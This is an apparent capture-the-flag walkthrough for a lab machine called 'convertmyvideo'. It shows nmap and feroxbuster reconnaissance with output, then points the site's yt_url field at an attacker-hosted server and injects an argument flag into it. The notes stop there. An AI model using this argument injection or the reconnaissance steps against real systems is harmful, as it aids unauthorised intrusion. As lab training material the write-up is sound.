# convertmyvideo

## Recon
```bash
silent-scan $TARGET
nmap -sVC -p22,80 $TARGET -oN service
```

**Output**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)
|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Fuzzing
```bash
feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt 
```

**Output**
```
401      GET       14l       54w      461c http://10.130.158.237/admin
301      GET        9l       28w      313c http://10.130.158.237/js => http://10.130.158.237/js/
301      GET        9l       28w      314c http://10.130.158.237/tmp => http://10.130.158.237/tmp/
```

### the is a interensting Directory named admin that runs apache auth
### Start burp proxy in the main page 

### Change the url to our python server 
```bash
python3 -m http.server 80
yt_url=http://LHOST
```
**Output**
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.130.158.237 - - [09/Jun/2026 13:26:24] "HEAD / HTTP/1.1" 200 -
10.130.158.237 - - [09/Jun/2026 13:26:24] "GET / HTTP/1.1" 20
```
### We can inject flags in the value
```bash
yt_url=--help
```